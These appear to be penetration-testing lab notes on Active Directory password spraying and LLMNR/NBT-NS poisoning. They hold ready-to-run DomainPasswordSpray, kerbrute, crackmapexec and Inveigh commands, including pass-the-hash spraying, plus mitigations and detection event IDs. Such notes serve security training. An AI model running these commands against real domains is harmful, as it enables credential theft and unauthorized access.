## Password spraying

### DomainPasswordSpray

[See DomainPasswordSpray](domainpasswordspray.md)

```powershell-session
Import-Module .\DomainPasswordSpray.ps1

# Authenticated in the domain:
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
# If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.

# Not authenticated in the domain:
Invoke-DomainPasswordSpray -UserList userlist.txt -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

### kerbrute

```
./kerbrute_windows_amd64.exe passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_ad_users  Welcome1
```

### crackmapexec

```powershell
# Spraying password with crackmapexec
crackmapexec smb $ip/23 -u /folder/userlist.txt -u administrator -H 88ad09182de639ccc6579eb0849751cf --local-auth --continue-on-success | grep +
# --continue-on-success:  continue spraying even after a valid password is found. Useful for spraying a single password against a large user list
# --local-auth:  if we are targetting a non-domain joined computer, we will need to use the option --local-auth. The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout.
# -H: hash
```


### Mitigation techniques against password spraying

- Multi-factor Authentication	
- Restricting Access
- Reducing Impact of Successful Exploitation
- Password Hygiene

In the Domain Controller’s security log, many instances of event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) over a short period may indicate a password spraying attack. Organizations should have rules to correlate many logon failures within a set time interval to trigger an alert. A more savvy attacker may avoid SMB password spraying and instead target LDAP. Organizations should also monitor event ID [4771: Kerberos pre-authentication failed](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771), which may indicate an LDAP password spraying attempt. To do so, they will need to enable Kerberos logging. This [post](https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-password-spraying-with-security-event-auditing) details research around detecting password spraying using Windows Security Event Logging.

## LLMNR/NBT-NS Poisoning

[See more](5355-LLMNR.md). 

[Link-Local Multicast Name Resolution](https://datatracker.ietf.org/doc/html/rfc4795) (LLMNR) and [NetBIOS Name Service](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10)?redirectedfrom=MSDN) (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails.

If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts.

It uses port `5355` over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port `137` over UDP.

The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with `Responder` to poison these requests.


### How does a typical attack work

1. A host attempts to connect to the print server at \\print01.inlanefreight.local, but accidentally types in \\printer01.inlanefreight.local.
2. The DNS server responds, stating that this host is unknown.
3. The host then broadcasts out to the entire local network asking if anyone knows the location of \\printer01.inlanefreight.local.
4. The attacker (us with `Responder` running) responds to the host stating that it is the \\printer01.inlanefreight.local that the host is looking for.
5. The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.
6. This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.

### Tools

Several tools can be used to attempt LLMNR & NBT-NS poisoning:

|**Tool**|**Description**|
|---|---|
|[Responder](https://github.com/lgandx/Responder)|Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.|
|[Inveigh](https://github.com/Kevin-Robertson/Inveigh)|Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.|
|[Metasploit](https://www.metasploit.com/)|Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.|

### Inveigh

[https://github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)

Mitre ATT&CK lists this technique as [ID: T1557.001](https://attack.mitre.org/techniques/T1557/001), `Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay`.

LLMNR & NBT-NS poisoning is possible from a Windows host as well. 

Inveigh is a cross-platform .NET IPv4/IPv6 machine-in-the-middle tool for penetration testers. The repo contains the primary C# version as well as the legacy PowerShell version.

Inveigh can listen to IPv4 and IPv6 and several other protocols, including `LLMNR`, DNS, `mDNS`, NBNS, `DHCPv6`, ICMPv6, `HTTP`, HTTPS, `SMB`, LDAP, `WebDAV`, and Proxy Auth.

#### Powershell version

The PowerShell version of Inveigh is the original version and is no longer updated. The tool author maintains the C# version (in the belowed section).
Configurable parameters in inveigh: [https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters)

```
# Install the module
Import-Module .\Inveigh.ps1

# List parameters
(Get-Command Invoke-Inveigh).Parameters

# Start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file.
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```


#### C# Inveigh (InveighZero)

Before we can use the C# version of the tool, we have to compile the executable. 

```powershell
.\Inveigh.exe
```
